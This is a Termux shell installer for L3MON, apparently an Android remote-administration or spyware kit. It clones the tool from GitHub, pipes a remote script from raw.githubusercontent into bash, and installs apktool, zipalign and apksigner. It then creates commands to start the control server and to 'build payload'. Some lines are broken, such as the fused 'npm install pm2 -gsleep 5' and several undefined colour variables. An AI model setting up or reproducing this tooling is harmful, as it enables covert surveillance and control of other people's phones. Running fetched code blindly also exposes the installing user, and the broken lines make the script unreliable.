#!/usr/bin/env sh

# ASCII color codes
YLW='\033[1;33m'
BLU='\033[0;34m'
CYN='\033[0;36m'
SAF='\033[38;5;202m'
WIT='\033[37m'
GRN='\033[0;32m'
NC='\033[0m' # No color

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"
echo "${YLW}Updating system${NC}"
echo "${GRN}PRESS 'Y' When ASKED then PRESS ENTER${NC}"
sleep 5

pkg update && pkg upgrade
pkg install git -y
clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

if [ ! -d "$PREFIX/opt" ]; then
  echo "${BLUE}Setting UP L3MON${NC}"
  mkdir "$PREFIX/opt"
  echo "${GREEN}SETUP Complete${NC}"
fi
sleep 3
if [ -d "$PREFIX/opt/l3mon" ]; then
  echo "${CYAN}Existing l3mon directory Found! Removing it${NC}"
  rm -rf "$PREFIX/opt/l3mon"
fi
sleep 5

if [ ! -d "$PWD/l3mon" ]; then
  echo "${BLUE}Dowloading L3MON${NC}"
  git clone https://github.com/Bhartiya-Hacker/L3MON
  echo "${GREEN}L3MON Download complete${NC}"
fi

sleep 6

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${YLW}Setting UP Directories${NC}"
mv -f L3MON/l3mon /$PREFIX/opt/
rm -rf L3MON
echo "${GRN}Directory SETUP Complete${NC}"
sleep 5
clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${YLW}Checking if java, nodejs & npm is installed or not${NC}"
if ! command -v java >/dev/null 2>&1 || ! command -v node >/dev/null 2>&1 || ! command -v npm >/dev/null 2>&1; then
  echo "${CYN}Packages not found, Installing them${NC}"
  pkg install -y openjdk-17 nodejs
else
  echo "${CYN}Packages Found, Removing them${NC}"
  pkg remove -y openjdk-17 nodejs
  echo "${CYN}Installing packages${NC}"
  pkg install -y openjdk-17 nodejs
fi
sleep 3

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${YLW}Installing pm2${NC}"
npm install pm2 -gsleep 5

echo "${YLW}Installation Complete${NC}"

sleep 5

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${YLW}Installing apktool, zipalign & apksigner${NC}"
sleep 5

curl -s https://raw.githubusercontent.com/rendiix/rendiix.github.io/master/install-repo.sh | bash
pkg install -y apksigner 
pkg install -y apktool zipalign

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${YLW}Installing L3MON${NC}"

sleep 5

npm install --prefix $PREFIX/opt/l3mon

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "Creating Symlinks"
sleep 5

echo "pushd $PREFIX/opt/l3mon && pm2 start index.js && popd" > "$PREFIX/bin/l3mon"
echo "pushd $PREFIX/opt/l3mon && pm2 stop index.js && popd" > "$PREFIX/bin/l3monx"
echo "pushd $PREFIX/opt/l3mon && ./builder.sh && popd" > "$PREFIX/bin/l3monb"

chmod +x "$PREFIX/bin/l3mon" "$PREFIX/bin/l3monx" "$PREFIX/bin/l3monb"

clear

echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
echo "${SAF}  ┃┃╱╱╱╱╱╱╱┃╭━╮┃╱╭╯╰╮╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃┃┃┃        ${NC}"
echo "${WIT}  ┃┃╱╱╭┳━━━┫╰━╯┣━┻╮╭╯╱┃┃╭━╮╭━┻╮╭╋━━┫┃┃┃╭━━┳━╮  ${NC}"
echo "${wIT}  ┃┃╱╭╋╋━━┃┃╭╮╭┫╭╮┃┃╱╱┃┃┃╭╮┫━━┫┃┃╭╮┃┃┃┃┃┃━┫╭╯  ${NC}"
echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣┫┃┃┣━━┃╰┫╭╮┃╰┫╰┫┃━┫┃   ${NC}"
echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
echo "${CYN}                                  By lUCIFER   ${NC}"

echo "${GRN}Installation complete${NC}, ${SAF}Run L3MON from Anywhere in TERMUX by executing 'l3mon'${NC}"
echo "${CYN}To build payload execute 'l3monb' Anywhere in TERMUX${NC}"
echo "${SAF}To stop the L3MON server execute 'l3monx' Anywhere in TERMUX${NC}"
